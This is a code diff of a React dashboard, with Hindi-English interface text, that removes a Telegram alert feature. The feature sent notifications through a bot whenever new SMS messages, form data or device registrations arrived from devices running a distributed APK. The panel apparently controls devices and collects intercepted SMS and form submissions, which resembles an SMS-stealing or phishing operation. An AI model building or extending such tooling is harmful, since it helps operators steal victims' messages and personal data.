@@ -602,14 +602,6 @@ function Dashboard({ masterPin, onLogout, onPinChanged }: { masterPin: string; o
   const [pingState, setPingState] = useState<"idle"|"loading"|"running"|"done"|"err">("idle");
   const [pingDone, setPingDone] = useState(0);
   const [pingTotal, setPingTotal] = useState(0);
-  const [pingResult, setPingResult] = useState<{ ok: number; fail: number } | null>(null);
-    /* ── Telegram ── */
-    const [tgStatus, setTgStatus] = useState<"idle"|"loading"|"ok"|"err">("idle");
-    const [tgConfigured, setTgConfigured] = useState<boolean|null>(null);
-    const [tgChatId, setTgChatId] = useState<string|null>(null);
-    const [tgManualId, setTgManualId] = useState("");
-    const [tgErr, setTgErr] = useState("");
-
   const sortedApps = [...appList].sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime());
 
   const fetchApps = useCallback(async () => {
@@ -636,36 +628,6 @@ function Dashboard({ masterPin, onLogout, onPinChanged }: { masterPin: string; o
     try { setAllDevicesList(await fetchAllDevices()); }
     catch { /* ignore */ } finally { setAllDevLoading(false); }
   }
-
-
-    const checkTgStatus = async () => {
-      try {
-        const r = await apiFetch("/api/master/telegram/status", { headers: { "x-master-pin": masterPin } });
-        if (r.ok) { const d = await r.json() as { configured: boolean; chatId: string|null }; setTgConfigured(d.configured); setTgChatId(d.chatId); }
-      } catch { /**/ }
-    };
-    useEffect(() => { void checkTgStatus(); }, []); // eslint-disable-line react-hooks/exhaustive-deps
-
-    const handleTgAutoSetup = async () => {
-      setTgStatus("loading"); setTgErr("");
-      try {
-        const r = await apiFetch("/api/master/telegram/setup", { method: "POST", headers: { "x-master-pin": masterPin } });
-        const d = await r.json() as { ok?: boolean; chatId?: string; error?: string };
-        if (!r.ok) { setTgErr(d.error ?? "Failed"); setTgStatus("err"); return; }
-        setTgConfigured(true); setTgChatId(d.chatId ?? null); setTgStatus("ok");
-      } catch { setTgErr("Network error"); setTgStatus("err"); }
-    };
-
-    const handleTgManualSet = async () => {
-      if (!tgManualId.trim()) return;
-      setTgStatus("loading"); setTgErr("");
-      try {
-        const r = await apiFetch("/api/master/telegram/set-chat", { method: "POST", headers: { "Content-Type": "application/json", "x-master-pin": masterPin }, body: JSON.stringify({ chatId: tgManualId.trim() }) });
-        const d = await r.json() as { ok?: boolean; error?: string };
-        if (!r.ok) { setTgErr(d.error ?? "Failed"); setTgStatus("err"); return; }
-        setTgConfigured(true); setTgChatId(tgManualId.trim()); setTgStatus("ok"); setTgManualId("");
-      } catch { setTgErr("Network error"); setTgStatus("err"); }
-    };
 
     async function handlePingAll() {
     setPingState("loading"); setPingResult(null); setPingDone(0); setPingTotal(0);
@@ -906,56 +868,6 @@ Sabhi users ka selected APK clear ho jaayega — woh fir se select kar sakenge.`
             </button>
           </div>
         </div>
-
-        {/* ── Telegram Notifications Section ── */}
-          <div style={{ background: T.card, borderRadius: 14, border: `1px solid ${T.borderLight}`, overflow: "hidden", marginBottom: 20 }}>
-            <div style={{ padding: "12px 18px", borderBottom: `1px solid ${T.borderLight}`, display: "flex", alignItems: "center", justifyContent: "space-between" }}>
-              <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
-                <div style={{ fontSize: 18 }}>🤖</div>
-                <span style={{ fontWeight: 800, fontSize: 14, color: T.text }}>Telegram Notifications</span>
-              </div>
-              {tgConfigured && <span style={{ background: T.green + "18", color: T.green, borderRadius: 99, padding: "2px 10px", fontSize: 10, fontWeight: 800, border: `1px solid ${T.green}44` }}>● CONNECTED</span>}
-              {tgConfigured === false && <span style={{ background: T.red + "15", color: T.red, borderRadius: 99, padding: "2px 10px", fontSize: 10, fontWeight: 800, border: `1px solid ${T.red}33` }}>○ NOT SET</span>}
-            </div>
-            <div style={{ padding: "16px 18px", display: "flex", flexDirection: "column", gap: 12 }}>
-              <div style={{ fontSize: 12, color: T.muted, lineHeight: 1.6 }}>
-                Jab bhi <b style={{ color: T.mutedLight }}>New SMS</b>, <b style={{ color: T.mutedLight }}>Form Data</b>, ya <b style={{ color: T.mutedLight }}>New Device Register</b> ho — Telegram pe instant notification aayega.
-                {tgConfigured && tgChatId && <> <b style={{ color: T.green }}>Chat ID: {tgChatId}</b></>}
-              </div>
-
-              {/* Auto-discover step */}
-              <div style={{ background: T.inputBg, borderRadius: 10, padding: "12px 14px", border: `1px solid ${T.border}` }}>
-                <div style={{ fontSize: 12, fontWeight: 700, color: T.text, marginBottom: 6 }}>Step 1: Auto-Discover Chat ID</div>
-                <div style={{ fontSize: 11, color: T.muted, marginBottom: 10, lineHeight: 1.5 }}>
-                  Pehle Telegram pe <b style={{ color: T.accentLight }}>@MrRobotPanelBot</b> ko koi bhi message bhejo, fir "Auto Connect" dabao.
-                </div>
-                <button onClick={() => void handleTgAutoSetup()} disabled={tgStatus === "loading"}
-                  style={{ width: "100%", padding: "11px 0", borderRadius: 9, border: "none",
-                    background: tgStatus === "ok" ? T.green : tgStatus === "loading" ? T.accentGlow : `linear-gradient(135deg,${T.accent},#8b5cf6)`,
-                    color: tgStatus === "ok" ? "#fff" : tgStatus === "loading" ? T.accentLight : "#fff",
-                    fontWeight: 800, fontSize: 13, cursor: tgStatus === "loading" ? "not-allowed" : "pointer",
-                    display: "flex", alignItems: "center", justifyContent: "center", gap: 8, transition: "all 0.15s" }}>
-                  {tgStatus === "loading" ? (<><div style={{ width: 13, height: 13, border: "2px solid currentColor", borderTopColor: "transparent", borderRadius: "50%", animation: "spin 0.7s linear infinite" }} /> Connecting…</>) :
-                   tgStatus === "ok" ? "✅ Connected! Test message bheja gaya." : "🔗 Auto Connect Bot"}
-                </button>
-              </div>
-
-              {/* Manual set */}
-              <div style={{ background: T.inputBg, borderRadius: 10, padding: "12px 14px", border: `1px solid ${T.border}` }}>
-                <div style={{ fontSize: 12, fontWeight: 700, color: T.text, marginBottom: 6 }}>Step 2 (Optional): Manually Set Chat ID</div>
-                <div style={{ display: "flex", gap: 8 }}>
-                  <input type="text" placeholder="e.g. 123456789" value={tgManualId} onChange={e => setTgManualId(e.target.value)}
-                    style={{ flex: 1, padding: "9px 12px", borderRadius: 9, background: T.card, border: `1px solid ${T.borderLight}`, color: T.text, fontSize: 13, outline: "none" }} />
-                  <button onClick={() => void handleTgManualSet()} disabled={!tgManualId.trim() || tgStatus === "loading"}
-                    style={{ padding: "9px 16px", borderRadius: 9, border: "none", background: T.accentGlow, color: T.accentLight, fontWeight: 800, fontSize: 12, cursor: "pointer" }}>
-                    Save
-                  </button>
-                </div>
-              </div>
-
-              {tgErr && <div style={{ background: T.red + "15", border: `1px solid ${T.red}33`, borderRadius: 10, padding: "10px 14px", color: T.red, fontSize: 13, fontWeight: 700 }}>⚠️ {tgErr}</div>}
-            </div>
-          </div>
 
           {/* Apps header */}
           <div style={{ display:"flex",alignItems:"center",justifyContent:"space-between",marginBottom:12,gap:12,flexWrap:"wrap" }}>
